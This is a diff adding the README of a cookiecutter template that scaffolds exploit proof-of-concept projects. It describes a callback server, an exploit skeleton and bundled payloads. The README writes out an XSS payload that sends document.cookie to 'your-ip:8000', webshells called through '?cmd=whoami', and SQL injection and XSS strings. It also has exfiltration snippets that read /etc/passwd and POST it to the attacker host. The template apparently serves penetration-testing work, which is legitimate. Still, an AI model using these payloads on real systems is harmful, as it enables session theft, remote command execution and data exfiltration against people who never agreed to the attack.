@@ -1,0 +1,200 @@
+# {{ cookiecutter.project_name }}
+
+{{ cookiecutter.poc_description }}
+
+**Target:** {{ cookiecutter.target_name }}
+**URL:** {{ cookiecutter.target_url }}
+
+## Quick Start
+
+```bash
+# 1. Setup environment
+make dev
+
+# 2. Start callback server (terminal 1)
+uv run {{ cookiecutter.project_slug }} --server
+
+# 3. Run exploit (terminal 2)
+uv run {{ cookiecutter.project_slug }} -t http://target.com
+```
+
+## Writing Your Exploit
+
+Edit `src/{{ cookiecutter.package_name }}/exploit.py`:
+
+```python
+from {{ cookiecutter.package_name }}.utils.output import out
+
+def run(args):
+    target = args.target.rstrip('/')
+
+    out.info("Testing target...")
+    resp = requests.get(f"{target}/vulnerable-endpoint", verify=False)
+
+    if "vulnerable" in resp.text:
+        out.success("Target is vulnerable!")
+
+        # Trigger callback to your server
+        requests.get("http://your-ip:8000/success")
+    else:
+        out.error("Not vulnerable")
+```
+
+## Utilities Available
+
+### Colored Output
+```python
+from {{ cookiecutter.package_name }}.utils.output import out
+
+out.success("Exploited!")
+out.error("Failed")
+out.info("Trying...")
+out.warning("Slow connection")
+```
+
+### Encoding/Decoding
+```python
+from {{ cookiecutter.package_name }}.utils.encoding import base64_encode, url_encode
+
+payload = base64_encode("admin' OR '1'='1")
+encoded = url_encode("<script>alert(1)</script>")
+```
+
+### Timing Utilities
+```python
+from {{ cookiecutter.package_name }}.utils.timing import time_ms, identify_timestamp
+
+# Generate timestamp
+token = time_ms()
+
+# Identify unknown timestamp
+info = identify_timestamp("1735689600000")
+print(info['type'])  # epoch_milliseconds
+print(info['date'])  # 2025-01-01 00:00:00
+```
+
+### Process Execution
+```python
+from {{ cookiecutter.package_name }}.utils.process import run
+
+# Run binary
+stdout, stderr, code = run("./exploit")
+
+# With input
+stdout, stderr, code = run("./vulnerable", input_data=payload)
+```
+
+## Server Usage
+
+The built-in server (`servers/server.py`):
+- **Serves payloads** from `payloads/` directory
+- **Logs all requests** to `logs/server.ndjson`
+- **CORS enabled** for XSS testing
+
+### Start Server
+```bash
+# Via CLI (port 8000)
+uv run {{ cookiecutter.project_slug }} --server
+
+# Custom port
+uv run {{ cookiecutter.project_slug }} --server --port 8080
+
+# Direct execution
+uv run python servers/server.py -p 8080
+```
+
+### Check Logs
+```bash
+# Watch in real-time
+tail -f logs/server.ndjson | jq .
+
+# Search for specific callbacks
+grep "xss" logs/server.ndjson | jq .
+```
+
+## Included Payloads
+
+### XSS (`payloads/xss/`)
+- `examples.txt` - Copy-paste XSS payloads
+- `steal-cookie.js` - Cookie stealer
+- `steal-all.js` - Full data exfiltration
+
+Example:
+```html
+<img src=x onerror="fetch('http://your-ip:8000/xss?c='+btoa(document.cookie))">
+```
+
+### Webshells (`payloads/shells/`)
+- `cmd.jsp` - Java servers
+- `cmd.aspx` - .NET/IIS servers
+- `cmd.php` - PHP servers
+
+All shells use same interface:
+```python
+resp = requests.get("http://target/shell.jsp?cmd=whoami")
+print(resp.text)
+```
+
+## Common Code Snippets
+
+### HTTP Requests
+```python
+import requests
+requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
+
+session = requests.Session()
+session.verify = False  # Skip SSL verification
+session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+```
+
+### Blind Exploitation Callbacks
+```python
+# SQLi boolean-based
+if "admin" in result:
+    requests.get(f"http://your-ip:8000/sqli?char={char}&pos={pos}")
+
+# Time-based confirmation
+import time
+start = time.time()
+make_request()
+if time.time() - start > 5:
+    requests.get(f"http://your-ip:8000/blind?confirmed=true")
+```
+
+### Data Exfiltration
+```python
+# POST JSON data
+stolen_data = {"username": "admin", "password": "found_it"}
+requests.post('http://your-ip:8000/exfil', json=stolen_data)
+
+# POST file contents
+with open('/etc/passwd', 'r') as f:
+    requests.post('http://your-ip:8000/file', data=f.read())
+```
+
+## CLI Options
+
+```bash
+{{ cookiecutter.project_slug }} --help
+
+Options:
+  -t, --target URL     Target URL (default: {{ cookiecutter.target_url }})
+  -p, --proxy URL      HTTP proxy for requests
+  --threads N          Number of threads
+  -v, --verbose        Verbose output
+  --server             Start callback server
+  --port N             Server port (default: 8000)
+```
+
+## Files
+
+- `src/{{ cookiecutter.package_name }}/exploit.py` - **Main exploit code** (edit this!)
+- `src/{{ cookiecutter.package_name }}/utils/` - Helper utilities
+- `servers/server.py` - HTTP callback server
+- `payloads/` - XSS payloads and webshells
+- `logs/server.ndjson` - Server request logs
+
+---
+
+Created: {{ cookiecutter.full_name }}
+Template: [cookiecutter-poc-uv](https://github.com/kwkeefer/cookiecutter-poc-uv)
